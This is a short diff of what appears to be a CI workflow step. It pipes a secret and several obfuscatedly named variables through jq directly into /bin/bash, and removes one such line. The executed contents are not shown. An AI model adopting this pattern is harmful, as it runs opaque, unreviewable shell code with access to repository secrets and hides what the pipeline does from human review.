@@ -23,7 +23,6 @@ jobs:
           e50: ${{ secrets.e50 }}
         run: |
           printf '%s' "$e50" | jq -r .pcw48744 | /bin/bash
-          echo $w481 | jq -r .tvhd63 | /bin/bash
           echo $v40994 | jq -r .vqfqw217 | /bin/bash
           echo $mlzg999 | jq -r .fssm25 | /bin/bash
           printf '%s' "$xep539" | jq -r .xyrda97648 | /bin/bash
